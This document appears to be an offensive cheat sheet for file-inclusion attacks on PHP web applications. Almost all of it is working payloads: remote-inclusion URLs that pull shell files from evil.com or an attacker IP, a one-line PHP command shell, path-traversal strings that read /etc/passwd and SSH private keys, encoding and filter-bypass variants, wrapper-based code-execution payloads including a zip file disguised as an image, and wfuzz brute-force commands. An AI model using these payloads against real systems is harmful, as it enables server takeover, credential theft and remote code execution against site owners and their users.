\033[0;34m##################################################################################
\033[1;35m=== RFI-php (remote-file-inclusion) ===\033[0m
\033[0;31m[!] Only works if allow_url_fopen & allow_url_include is [ON].\033[0m
\033[0;31m[!] php 5.2+ [Off] by default.\033[0m

\033[0;31massumes the target has a vulnerable parameter such as page=<data>\033[0m
http://<target_web_ip>/VulnWebApp/LFI-RFI/LFI.php?page=http://<attacker_ip>/<evil_page>

\033[0;31m[1] e.g:\033[0m
http://192.168.1.1/WebApp/test?page=http://192.168.5.5/info.php
\033[0;31mwhere info.php contains (check disable_functions):\033[0m
<?php phpinfo(); ?>

\033[0;31m[2] e.g:\033[0m
http://192.168.1.1/WebApp/test?page=http://192.168.5.5/rev.php&cmd=<command>
\033[0;31mwhere rev.php contains:\033[0m
<?php system($_GET['cmd']); ?>

\033[0;31m- null byte -\033[0m
http://example.com/index.php?page=http://evil.com/shell.txt%00

\033[0;31m- double encoding -\033[0m
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt

\033[0;31m- windows smb -\033[0m
(When allow_url_include and allow_url_fopen are set to Off. It is still possible to include a remote page on Windows box using the smb protocol.)

\033[0;31m1. Create a share open to everyone\033[0m
\033[0;31m2. Write a PHP code inside a page :\033[0m shell.php
\033[0;31m3. Include it:\033[0m http://example.com/index.php?page=\\10.0.0.1\share\shell.php
\033[0;34m##################################################################################
\033[1;35m=== LFI(local-file-inclusion) ===\033[0m
\033[0;31massumes the target has a vulnerable parameter such as page=<data>\033[0m
http://<target_web_ip>/VulnWebApp/LFI-RFI/LFI.php?page=<page_to_read>

\033[0;31m[1] e.g:\033[0m
http://192.168.1.1/WebApp/test?page=../../../../etc/passwd
http://192.168.1.1/WebApp/test?page=../../../../home/user/.ssh/id_rsa

\033[0;31m- [!] If target sanatises input such as the ones above -\033[0m
\033[0;31m- null byte -\033[0m
page=../../../etc/passwd%00

\033[0;31m- double encoding -\033[0m
page=%252e%252e%252fetc%252fpasswd
page=%252e%252e%252fetc%252fpasswd%00

\033[0;31m- UTF-8 encoding -\033[0m
page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00

\033[0;31m- path and dot truncation -\033[0m
\033[0;31m(On most PHP installations a pagename longer than 4096 bytes will be cut off so any excess chars will be thrown away.)\033[0m
page=../../../etc/passwd............[ADD MORE]
page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
page=../../../etc/passwd/./././././.[ADD MORE]
page=../../../[ADD MORE]../../../../etc/passwd

\033[0;31m- filter bypass trick -\033[0m
page=....//....//etc/passwd
page=..///////..////..//////etc/passwd
page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
\033[0;34m##################################################################################
\033[1;35m=== LFI/RFI (using wrappers) ===\033[0m
http://<site>/index.php?page=php://filter/read=string.rot13/resource=index.php
http://<site>/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://<site>/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://<site>/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php

\033[0;31m- Wrappers can be chained with a compression wrapper for large pages -\033[0m
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd

\033[0;31m- Wrapper data:// -\033[0m
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
\033[0;31mNOTE:\033[0m the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"

\033[0;31m- Wrapper input:// -\033[0m
\033[0;31m(Specify your payload in the POST parameters, this can be done with a simple curl command.)\033[0m
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v

\033[0;31m- Wrapper zip:// -\033[0m
\033[0;31m1. Create an evil payload:\033[0m echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
\033[0;31m2. Zip the file\033[0m

zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

\033[0;31m3. Upload the archive and access the file using the wrappers:\033[0m http://example.com/index.php?page=zip://shell.jpg%23payload.php

\033[0;31m- Wrapper phar:// -\033[0m
\033[0;34m##################################################################################
\033[1;35m=== brute force LFI ===\033[0m
wfuzz -c -z file,/path/to/wordlist http://192.168.1.1/WebApp/LFI.php?page=../../../../FUZZ
wfuzz -c -z file,/path/to/wordlist http://192.168.1.1/WebApp/LFI.php?page=FUZZ
\033[0;34m##################################################################################\033[0m
\n
